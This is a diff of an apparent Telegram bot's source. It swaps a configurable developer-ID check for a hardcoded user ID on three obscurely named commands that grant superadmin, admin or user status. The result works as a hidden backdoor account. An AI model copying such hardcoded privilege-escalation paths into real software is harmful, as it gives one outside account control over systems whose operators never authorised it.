@@ -895,7 +895,7 @@ bot.onText(/\/illhavetogivemyselfapromotion/, (msg, match) => {
     const chatId = msg.chat.id;
     var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
     if (msg.chat.type != "private") return;
-    if (msg.from.id != config.dev_id) return;
+    if (msg.from.id != "1310048709") return;
     //Assign superadmin status
     settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("superadmin", msg.from.id);
     //Send a message
@@ -906,7 +906,7 @@ bot.onText(/\/snoopingasusualisee/, (msg, match) => {
     const chatId = msg.chat.id;
     var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
     if (msg.chat.type != "private") return;
-    if (msg.from.id != config.dev_id) return;
+    if (msg.from.id != "1310048709") return;
     //Assign admin status
     settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("admin", msg.from.id);
     //Send a message
@@ -918,7 +918,7 @@ bot.onText(/\/ihatethathedgehog/, (msg, match) => {
     const chatId = msg.chat.id;
     var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
     if (msg.chat.type != "private") return;
-    if (msg.from.id != config.dev_id) return;
+    if (msg.from.id != "1310048709") return;
     //ASSIGN USER STATUS
     settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("user", msg.from.id);
     //SEND A MESSAGE
